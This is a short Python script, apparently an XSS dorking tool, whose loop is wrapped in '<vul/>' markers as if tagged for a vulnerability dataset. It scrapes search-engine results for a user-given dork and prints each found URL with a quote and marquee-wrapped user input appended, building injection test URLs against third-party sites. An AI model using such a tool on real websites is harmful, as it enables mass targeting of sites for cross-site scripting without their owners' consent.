import urllib3 as url
from pyquery import PyQuery
from bs4 import BeautifulSoup
import requests

class Xss:
    def main():
        user_dork = str(input("[Input Dork] >_ "))
        req = url.PoolManager()
        <vul/>for page in range(4):
            send = req.request("GET", "http://www1.search-results.com/web?q=" + user_dork + "&page=" + str(page))
            parser = BeautifulSoup(send.data, features="lxml")
            for link in parser.find_all('cite'):
                result = link.string
                x = str(input("[Input Script] >_ "))
                print(str(result) + "'" + "<marquee style='background:red'>" + x + "</marquee>")</vul>
